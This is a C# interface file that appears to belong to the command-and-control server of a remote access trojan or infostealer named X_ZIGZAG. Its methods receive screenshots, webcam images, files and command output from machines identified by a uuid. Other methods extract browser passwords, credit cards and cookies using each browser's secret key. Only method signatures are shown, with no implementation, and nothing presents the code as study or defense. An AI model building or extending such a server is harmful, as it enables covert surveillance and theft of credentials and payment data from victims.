
using X_ZIGZAG_SERVER_WEB_API.ViewModels.Response;

namespace X_ZIGZAG_SERVER_WEB_API.Interfaces
{
    public interface IResponseService
    {
        public Task<List<ResultResponseVM>>? GetAllResponse(string uuid);
        public Task StoreScreenshot(string uuid,int ScreenIndex, byte[] imageData);
        public Task StoreWebcam(string uuid,int CameraIndex, byte[] imageData,long instructionId);
        public Task StoreFile(string uuid,long instructionId, IFormFile file);
        public Task ResponseOutput(string uuid,long instructionId, string ?output);
        public Task BrowserPasswordExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);
        public Task BrowserCreditCardExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);
        public Task BrowserCookiesExtracting(string uuid,long instructionId, byte[] file, byte[] secretKey, string BrowserName);

    }
}
